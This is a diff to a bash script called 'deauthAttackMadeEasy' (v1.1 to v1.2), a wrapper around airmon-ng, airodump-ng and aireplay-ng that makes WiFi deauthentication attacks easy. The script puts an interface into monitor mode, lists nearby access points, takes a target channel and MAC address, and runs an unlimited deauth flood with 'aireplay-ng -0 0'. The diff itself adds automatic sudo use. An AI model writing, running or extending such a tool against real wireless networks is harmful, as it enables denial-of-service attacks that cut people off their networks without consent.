@@ -1,12 +1,13 @@
 #!/bin/bash
 
 #
-# deauthAttackMadeEasy v1.1
+# deauthAttackMadeEasy v1.2
 #
 
 configLocation=".deauthAttack.config"
 
-echo "Welcome to the siiiimplist way to deauth WAPs!"
+thisUser=$(whoami)
+echo "Welcome $thisUser to the siiiimplist way to deauth WAPs!"
 sleep 0.1
 
 function checkRequirements() {
@@ -37,6 +38,13 @@ fi
 
 function checkInterfaces() {
 #display network interfaces
+
+if [ $thisUser != "root" ]
+then
+	isRoot="sudo"
+else
+	isRoot=""
+fi
 
 devNetNum=0
 
@@ -150,9 +158,10 @@ fi
 function setupDevice() {
 #sets into monitor mode
 
-airmon-ng start $wifd > /dev/null && echo "Monitor mode enabled for: $wifd"
+$isRoot airmon-ng start $wifd > /dev/null && echo "Monitor mode enabled for: $wifd"
 
-echo "At anypoint, if you Ctrl^C a point where this program is still running, disabling monitor mode is as easy as typing exactly: 'airmon-ng stop $wifd$mon'"
+mon="mon"
+echo "At anypoint, if you Ctrl^C a point where this program is still running, disabling monitor mode is as easy as typing exactly: '$isRoot airmon-ng stop $wifd$mon' "
 sleep 3
 
 listAccessPoints
@@ -161,8 +170,6 @@ listAccessPoints
 
 function listAccessPoints() {
 #opens airodump-ng to display MAC addresses
-
-mon="mon"
 wifdlAP="$wifd$mon"
 
 echo "Press Ctrl^C when you see the target network(s)..."
@@ -170,7 +177,7 @@ sleep 3
 
 #ifconfig | grep h0 | cut -f1 -d' '
 
-airodump-ng $wifdlAP
+$isRoot airodump-ng $wifdlAP
 
 changeChannel
 
@@ -179,13 +186,13 @@ changeChannel
 function changeChannel() {
 #select target channel, reconfigure monitor mode with selected channel
 
-echo -n "Enter target channel (number): "
+echo -n "Enter target channel number (^CH): "
 read targetChannel
 
 if [[ $targetChannel =~ ^-?[0-9]+$ ]]
 then
-	airmon-ng stop $wifd$mon > /dev/null && echo "Reconfiguring $wifd"
-	airmon-ng start $wifd $targetChannel > /dev/null && echo "Monitor mode enabled on channel $targetChannel for: $wifd"
+	$isRoot airmon-ng stop $wifd$mon > /dev/null && echo "Reconfiguring $wifd"
+	$isRoot airmon-ng start $wifd $targetChannel > /dev/null && echo "Monitor mode enabled on channel $targetChannel for: $wifd"
 	selectTarget
 
 else
@@ -199,8 +206,7 @@ fi
 function selectTarget() {
 #selecting a MAC address
 
-echo -n "Please enter target MAC address."
-echo -n "You can copy from above."
+echo "Please enter target MAC address. (Note: you can copy from above ^) "
 echo -n "Target: "
 read targetMAC
 
@@ -226,7 +232,7 @@ then
 
 	#deconfigure to cancel
         echo "Exiting and reconfiguring $wifd..."
-        airmon-ng stop $wifd$mon > /dev/null
+        $isRoot airmon-ng stop $wifd$mon > /dev/null
 	echo "Reconfiguring complete, exiting..."
 	exit
 
@@ -271,11 +277,11 @@ function runAttack() {
 echo "About to run; Reminder to press Ctrl^C when you're happy with your attack!"
 sleep 2
 
-timeout $length$sss aireplay-ng -0 0 -a $targetMAC $wifd$mon
+$isRoot timeout $length$sss aireplay-ng -0 0 -a $targetMAC $wifd$mon
 
 #deconfigure from monitor mode
 echo "Attack finished; Reconfiguring interface $wifd and closing..."
-airmon-ng stop $wifd$mon > /dev/null
+$isRoot airmon-ng stop $wifd$mon > /dev/null
 echo "Complete. Done."
 exit
 
